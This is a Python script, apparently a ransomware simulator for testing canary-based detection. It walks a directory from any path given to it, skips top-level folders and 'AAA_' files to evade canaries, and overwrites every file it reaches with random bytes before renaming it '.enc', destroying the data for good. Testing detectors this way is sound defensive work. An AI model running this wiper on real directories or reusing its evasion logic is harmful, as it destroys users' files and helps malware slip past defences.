import os

def random_content(size=4096):
    return os.urandom(size)

def sim_depth(root_dir: str, min_depth: int = 3):
    """
    Simulate ransomware starting from deep subdirectory.
    Only processes files at min_depth or deeper.
    This tries to avoid canaries placed at top-level hotspots.
    """
    print(f"[SIM_DEPTH] Starting depth-limited traversal from {root_dir} (min_depth={min_depth})")
    count = 0
    for dirpath, dirnames, filenames in os.walk(root_dir):
        # calculate current depth
        depth = dirpath.replace(root_dir, "").count(os.sep)
        if depth < min_depth:
            continue
        for filename in filenames:
            if filename.startswith("AAA_") or filename.endswith(".enc"):
                continue
            filepath = os.path.join(dirpath, filename)
            try:
                with open(filepath, "wb") as f:
                    f.write(random_content())
                enc_path = filepath + ".enc"
                os.rename(filepath, enc_path)
                count += 1
                print(f"[SIM_DEPTH] Encrypted: {enc_path}")
            except Exception as e:
                print(f"[SIM_DEPTH] Skipped {filepath}: {e}")
    print(f"[SIM_DEPTH] Done. {count} files encrypted.")

if __name__ == "__main__":
    import sys
    root = sys.argv[1] if len(sys.argv) > 1 else "/tmp/sim_test"
    os.makedirs(root, exist_ok=True)
    sim_depth(root)
